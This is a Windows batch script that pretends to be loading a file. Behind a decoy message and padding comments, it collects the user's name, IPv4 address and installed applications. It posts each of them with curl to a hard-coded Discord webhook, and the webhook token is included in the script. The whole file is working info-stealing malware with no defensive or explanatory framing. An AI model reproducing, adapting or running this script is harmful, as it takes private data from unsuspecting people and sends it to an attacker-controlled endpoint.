@echo off
cls
echo Please wait while the file loads....
@echo off

  REM NOT YOUR CODE
  REM NOT YOUR CODE
  REM NOT YOUR CODE
  REM NOT YOUR CODE
  REM NOT YOUR CODE
  REM NOT YOUR CODE
  REM NOT YOUR CODE
  REM NOT YOUR CODE
  REM NOT YOUR CODE
  REM NOT YOUR CODE
  REM NOT YOUR CODE
  REM NOT YOUR CODE
  REM NOT YOUR CODE
  REM NOT YOUR CODE
  REM NOT YOUR CODE
  REM NOT YOUR CODE
  REM NOT YOUR CODE
  REM NOT YOUR CODE
  REM NOT YOUR CODE
  REM NOT YOUR CODE
  REM NOT YOUR CODE
  REM NOT YOUR CODE
  REM NOT YOUR CODE
  REM NOT YOUR CODE
  REM NOT YOUR CODE
  REM NOT YOUR CODE
  REM NOT YOUR CODE
  REM NOT YOUR CODE
  REM NOT YOUR CODE
  REM NOT YOUR CODE
  REM NOT YOUR CODE
 
set WEBHOOK_URL=https://discord.com/api/webhooks/1251686634580349089/Akz_YdrBsNvC9jEF3DYBrAAgfDg3KariUdu1oo6xxHVKF2lW23zDPaTRJm2fWPqFCetb

REM Set your message or data to send
set info=# %USERNAME%

REM Prepare JSON payload with the variable
set "payload={\"content\":\"%info%\"}"

REM Send POST request to Discord webhook
curl -H "Content-Type: application/json" -X POST -d "%payload%" "%WEBHOOK_URL%"

REM Optional: Uncomment the line below to pause and see any error messages
REM pause

REM Use ipconfig to get IPv4 address
for /f "tokens=2 delims=:" %%A in ('ipconfig ^| findstr /c:"IPv4 Address"') do (
    set IP_ADDRESS=%%A
)

REM Remove leading and trailing spaces
set IP_ADDRESS=%IP_ADDRESS:~1%


REM Set your message or data to send
set info=IP: %IP_ADDRESS%

REM Prepare JSON payload with the variable
set "payload={\"content\":\"%info%\"}"

REM Send POST request to Discord webhook
curl -H "Content-Type: application/json" -X POST -d "%payload%" "%WEBHOOK_URL%"


REM -----------------------------------------------------------------------------------------------------------------

REM Set your message or data to send
set info=## Installed apps

REM Prepare JSON payload with the variable
set "payload={\"content\":\"%info%\"}"

REM Send POST request to Discord webhook
curl -H "Content-Type: application/json" -X POST -d "%payload%" "%WEBHOOK_URL%"

@echo off
setlocal enabledelayedexpansion

REM Define your Discord webhook URL
set "webhookUrl=https://discord.com/api/webhooks/1251686634580349089/Akz_YdrBsNvC9jEF3DYBrAAgfDg3KariUdu1oo6xxHVKF2lW23zDPaTRJm2fWPqFCetb"

REM Initialize a variable to store the content of the text file
set "textContent=Installed Applications:%0D%0A"

REM Query WMIC for installed applications and add them to textContent
for /f "skip=1 delims=" %%A in ('wmic product get name') do (
    set "IA=%%A"
    set "textContent=!textContent!!IA!%0D%0A"
)

REM Save textContent to a temporary text file
set "tempFile=%temp%\installed_apps.txt"
echo !textContent! > "%tempFile%"

REM Send the text file to Discord webhook using cURL (make sure cURL is available)
curl -F "file=@%tempFile%" -F "content=List of Installed Applications" %webhookUrl%

REM Clean up temporary file
del "%tempFile%"




















